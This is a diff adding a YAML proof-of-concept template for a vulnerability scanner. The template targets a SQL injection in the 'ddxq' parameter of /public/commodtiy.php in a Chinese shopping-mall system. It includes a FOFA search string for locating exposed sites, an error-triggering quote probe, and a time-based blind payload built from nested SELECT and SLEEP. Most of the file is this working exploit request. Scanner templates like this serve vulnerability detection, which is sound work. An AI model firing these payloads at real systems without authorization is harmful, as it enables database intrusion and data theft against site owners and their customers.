@@ -1,0 +1,27 @@
+id: poc-yaml-shopping-mall-system-commodtiy-sqli
+info:
+  name: 购物商城系统 commodtiy SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 购物商城系统
+  fofa: body="/public/gwc.php"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /public/commodtiy.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: ddxq='
+  expression: status_code == 200 && contains(body,"mysqli_fetch_assoc()") && contains(body,"boolean
+    given in")
+- method: POST
+  path: /public/commodtiy.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: ddxq='||(SELECT 0x51677568 WHERE 7422=7422 AND (SELECT 7155 FROM (SELECT (SLEEP({{.t1}})))pWQk))||'
+  expression: status_code == 200 && contains(body,`{"ddh":null}`) && duration > t1
+    && duration < t2
+transport: http
